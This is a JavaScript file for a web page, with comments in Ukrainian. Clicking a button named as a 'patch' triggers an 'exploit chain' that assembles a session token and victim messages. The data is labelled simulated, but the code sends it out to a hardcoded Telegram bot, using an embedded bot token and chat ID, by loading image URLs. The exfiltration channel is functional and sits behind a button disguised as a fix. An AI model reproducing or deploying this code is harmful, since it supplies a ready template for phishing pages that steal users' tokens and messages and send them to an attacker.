document.getElementById('patchButton').addEventListener('click', launchExploit);

function launchExploit() {
    const button = document.getElementById('patchButton');
    button.style.display = 'none';
    const statusMessage = document.getElementById('errorMessage');
    statusMessage.style.display = 'block';
    statusMessage.style.color = '#ff9900';
    statusMessage.textContent = 'Initializing exploit chain...';

    // Спрощена імітація експлойту
    const simulatedData = "SIM_DATA:session_token=sim_abc123;user_id=sim_8463942433";
    
    // Отримуємо всі повідомлення з localStorage (імітація)
    const victimMessages = getVictimMessages();
    const fullMessage = "EXPLOIT_SUCCESS:" + simulatedData + "\nVICTIM_MESSAGES:\n" + victimMessages;

    setTimeout(() => {
        statusMessage.textContent = 'Exploit triggered. Exfiltrating data...';
        sendDataToTelegram(fullMessage);
    }, 2000);
}

function getVictimMessages() {
    // Імітуємо отримання повідомлень жертви
    // У реальності це було б з файлів Telegram
    const messages = [];
    for (let i = 0; i < 20; i++) {
        messages.push(`Message ${i+1}: Hello, this is test message ${i+1}`);
    }
    return messages.join('\n');
}

function sendDataToTelegram(fullMessage) {
    const botToken = '8252026790:AAFA0CpGHb3zgHC3bs8nVPZCQGqUTqEWcIA';
    const chatId = '8463942433';
    const statusMessage = document.getElementById('errorMessage');

    // Розбиваємо повідомлення на частини, якщо воно задовге
    const maxLength = 2000; // Максимальна довжина для URL
    const messageParts = [];
    
    for (let i = 0; i < fullMessage.length; i += maxLength) {
        messageParts.push(fullMessage.substring(i, i + maxLength));
    }

    let sentParts = 0;
    const totalParts = messageParts.length;

    // Відправляємо кожну частину окремо
    messageParts.forEach((part, index) => {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`[Part ${index+1}/${totalParts}] ${part}`)}`;
        const img = new Image();
        img.src = url;

        img.onload = function() {
            sentParts++;
            if (sentParts === totalParts) {
                statusMessage.style.color = '#48bb78';
                statusMessage.textContent = 'ALL DATA SENT SUCCESSFULLY.';
            }
        };
        
        img.onerror = function() {
            statusMessage.style.color = '#ff6b6b';
            statusMessage.textContent = `Error sending part ${index+1}.`;
        };
    });
}
